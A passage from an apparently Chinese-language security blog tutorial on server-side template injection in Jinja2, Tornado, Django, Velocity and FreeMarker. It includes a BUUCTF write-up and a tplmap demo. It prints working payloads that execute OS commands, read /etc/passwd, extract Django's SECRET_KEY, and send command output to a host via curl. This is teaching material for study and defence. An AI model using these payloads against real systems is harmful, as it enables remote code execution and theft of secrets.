class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><h4 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><h4 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;         &#x2F;&#x2F;popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p><p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 tplmap.py -u &quot;http:&#x2F;&#x2F;172.20.10.2:8000&#x2F;?name&#x3D;*&quot; --os-shell</span><br><span class="line">Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">Testing if GET parameter &#39;name&#39; is injectable</span><br><span class="line">Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">Smarty plugin is testing blind injection</span><br><span class="line">Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">Mako plugin is testing blind injection</span><br><span class="line">Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">Python plugin is testing blind injection</span><br><span class="line">Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tornado plugin is testing blind injection</span><br><span class="line">Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Jinja2 plugin has confirmed injection with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">Run commands on the operating system.</span><br><span class="line">posix-linux $ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>一键shell真香，还支持其他模版(Smarty, Mako, Tornado, Jinja2) 的注入检测</p><h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</p><p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tornado.template</span><br><span class="line">import tornado.ioloop</span><br><span class="line">import tornado.web</span><br><span class="line">TEMPLATE &#x3D; &#39;&#39;&#39;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt; Hello max &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    def get(self):</span><br><span class="line">        name &#x3D; self.get_argument(&#39;name&#39;, &#39;&#39;)</span><br><span class="line">        template_data &#x3D; TEMPLATE.replace(&quot;FOO&quot;,name)</span><br><span class="line">        t &#x3D; tornado.template.Template(template_data)</span><br><span class="line">        self.write(t.generate(name&#x3D;name))</span><br><span class="line"></span><br><span class="line">application &#x3D; tornado.web.Application([(r&quot;&#x2F;&quot;, MainHandler),], debug&#x3D;True, static_path&#x3D;None, template_path&#x3D;None)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    application.listen(8000)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>我们这里来用BUUCTF的easy_tornado来学习一下tornado render注入：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173354843.png" alt="image-20220209173354843"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173408296.png" alt="image-20220209173408296"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173423416.png" alt="image-20220209173423416"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173438540.png" alt="image-20220209173438540"></p><p>根据上面的信息，我们知道flag在/fllllllllllllag文件中</p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p><p>最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;3cf85a0e74c78ca404fd6ba98f1eacaa</span><br></pre></td></tr></table></figure><p>推测md5加密过后的值就是url中filehash对应的值,想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p><p>在tornado模板中，存在一些可以访问的快速对象，比如 &#123;&#123;escape(handler.settings[“cookie”])&#125;&#125;，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p><p>观察错误页面，发现页面返回的由msg的值决定</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173614183.png" alt="image-20220209173614183"></p><p>修改msg的值注入，获得环境变量</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173654529.png" alt="image-20220209173654529"></p><p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename&#x3D;&#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">cookie_secret&#x3D;&quot;0eac01c9-92b5-459e-b475-287893e5ff3f&quot;</span><br><span class="line">hash.update(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">s1&#x3D;hash.hexdigest()</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174140368.png" alt="image-20220209174140368"></p><p>得到filehash=e952b058e7c5d648833b3bb13c52bb1b，获取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;e952b058e7c5d648833b3bb13c52bb1b</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174219355.png" alt="image-20220209174219355"></p><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>先看存在漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;request.user))</span><br></pre></td></tr></table></figure><p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p><p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209175837650.png" alt="image-20220209175837650"></p><p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><h1 id="Java中的SSTI"><a href="#Java中的SSTI" class="headerlink" title="Java中的SSTI"></a>Java中的SSTI</h1><p>java常见的引擎：FreeMarker， velocity</p><h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p><p><strong>基本语法</strong></p><p><strong>语句标识符</strong></p><p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p><p><strong>变量</strong></p><p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p><p><strong>声明</strong></p><p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure><p><strong>注释</strong></p><p>单行注释为##，多行注释为成对出现的#* …………. *#</p><p><strong>条件语句</strong></p><p>以if/else为例：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($foo&#x3D;&#x3D;10)</span><br><span class="line">    &lt;strong&gt;2&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($bar&#x3D;&#x3D;6)</span><br><span class="line">    &lt;strong&gt;3&lt;&#x2F;strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;&#x2F;strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>转义字符</p><p><strong>转义字符</strong></p><p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p><p><strong>基础使用</strong></p><p>使用Velocity主要流程为：</p><ul><li>初始化Velocity模板引擎，包括模板路径、加载类型等</li><li>创建用于存储预传递到模板文件的数据的上下文</li><li>选择具体的模板文件，传递数据完成渲染</li></ul><p>VelocityTest.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine &#x3D; new VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src&#x2F;main&#x2F;resources&quot;);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;Rai4over&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Template template &#x3D; velocityEngine.getTemplate(&quot;test.vm&quot;);</span><br><span class="line">        StringWriter sw &#x3D; new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模版文件：src/main/resources/test.vm</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final output:</span><br><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is Victor Zhang.</span><br><span class="line">Project is Velocity</span><br><span class="line">java.lang.UNIXProcess@12f40c25</span><br></pre></td></tr></table></figure><p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p><p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p><p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p><p>我们这里使用Java-sec-code里面的SSTI代码（关于Java-sec-code相关部分在之前的文章已经写过）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在最初的Controller层下断点，来追踪poc的解析过程</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210111913083.png" alt="image-20220210111913083"></p><p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean evaluate(Context context, Writer out, String logTag, String instring) throws ParseErrorException, MethodInvocationException, ResourceNotFoundException &#123;</span><br><span class="line">    return RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210113238084.png" alt="image-20220210113238084"></p><p>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115314686.png" alt="image-20220210115314686"></p><p>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115616974.png" alt="image-20220210115616974"></p><p>进入StringReader查看在进入evaluate查看方法具体实现过程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean evaluate(Context context, Writer writer, String logTag, Reader reader) &#123;</span><br><span class="line">        if (logTag &#x3D;&#x3D; null) &#123;</span><br><span class="line">            throw new NullPointerException(&quot;logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            SimpleNode nodeTree &#x3D; null;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F; 来到这里进行解析</span><br><span class="line">                nodeTree &#x3D; this.parse(reader, logTag);</span><br><span class="line">            &#125; catch (ParseException var7) &#123;</span><br><span class="line">                throw new ParseErrorException(var7, (String)null);</span><br><span class="line">            &#125; catch (TemplateInitException var8) &#123;</span><br><span class="line">                throw new ParseErrorException(var8, (String)null);</span><br><span class="line">            &#125;</span><br><span class="line">           &#x2F;&#x2F; 判断，然后进入this.render方法</span><br><span class="line">            return nodeTree &#x3D;&#x3D; null ? false : this.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进render方法</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121343406.png" alt="image-20220210121343406"></p><p>render方法里面还有一个render方法,不过这个是simpleNodel类的render方法。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121433075.png" alt="image-20220210121433075"></p><p>由于前面两个没有什么用，让我们直接跳到for循环的第三个看，进入render方法。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121748125.png" alt="image-20220210121748125"></p><p>在这里我们发现有一个execute方法，这就是罪魁祸首。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122230972.png" alt="image-20220210122230972"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i &#x3D; 0; i &lt; this.numChildren; ++i) &#123;</span><br><span class="line">     if (this.strictRef &amp;&amp; result &#x3D;&#x3D; null) &#123;</span><br><span class="line">         methodName &#x3D; this.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">         throw new VelocityException(&quot;Attempted to access &#39;&quot; + methodName + &quot;&#39; on a null value at &quot; + Log.formatFileString(this.uberInfo.getTemplateName(), this.jjtGetChild(i).getLine(), this.jjtGetChild(i).getColumn()));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     previousResult &#x3D; result;</span><br><span class="line">     result &#x3D; this.jjtGetChild(i).execute(result, context);</span><br><span class="line">     if (result &#x3D;&#x3D; null &amp;&amp; !this.strictRef) &#123;</span><br><span class="line">         failedChild &#x3D; i;</span><br><span class="line">         break;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</li><li>previousResult = result;首先这行代码使其它们保持一致</li><li>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122522307.png" alt="image-20220210122522307"></p><p>完整的调用链如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122717456.png" alt="image-20220210122717456"></p><h2 id="Confluence未授权RCE分析"><a href="#Confluence未授权RCE分析" class="headerlink" title="Confluence未授权RCE分析"></a>Confluence未授权RCE分析</h2><p>（CVE-2019-3396）</p><p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p><p>具体漏洞代码调试可以参考：《<a href="https://caiqiqi.github.io/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p><p>　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](<a href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152321533.png" alt="image-20220210152321533"></p><p><strong>FreeMarker模板代码</strong>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#–这是注释–&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href&#x3D;&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;&#x2F;a&gt;!</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p><p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p><p>具体的高级内置函数定义参考《<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152835575.png" alt="image-20220210152835575"></p><p>主要用法如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;</span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;</span><br></pre></td></tr></table></figure><p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p><p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure><p>这里使用测试代码来大概演示一下：<a href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p><p>前端代码　　——&gt;　　hello.ftl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Hello $&#123;name&#125;!&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>后端代码　　——&gt;　　HelloController.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.hellokoding.springboot;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloController &#123;</span><br><span class="line">    @GetMapping(&quot;&#x2F;&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello(Model model, @RequestParam(value&#x3D;&quot;name&quot;, required&#x3D;false, defaultValue&#x3D;&quot;World&quot;) String name) &#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;, name);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码主要编译给定的模版字符串和数据，生成HTML进行输出</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155732477.png" alt="image-20220210155732477"></p><p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155853956.png" alt="image-20220210155853956"></p><h3 id="模版注入利用"><a href="#模版注入利用" class="headerlink" title="模版注入利用"></a>模版注入利用</h3><h4 id="new函数的利用"><a href="#new函数的利用" class="headerlink" title="new函数的利用"></a>new函数的利用</h4><p><strong>利用方法一：</strong></p><p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p><p>freemarker.template.utility.Execute 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22 public Object exec(List arguments) throws TemplateModelException &#123;</span><br><span class="line">23    StringBuilder aOutputBuffer &#x3D; new StringBuilder();</span><br><span class="line">24    if (arguments.size() &lt; 1) &#123;</span><br><span class="line">25        throw new TemplateModelException(&quot;Need an argument to execute&quot;);</span><br><span class="line">26    &#125; else &#123;</span><br><span class="line">27        String aExecute &#x3D; (String)((String)arguments.get(0));</span><br><span class="line">28</span><br><span class="line">29        try &#123;</span><br><span class="line">30            Process exec &#x3D; Runtime.getRuntime().exec(aExecute);</span><br><span class="line">31            InputStream execOut &#x3D; 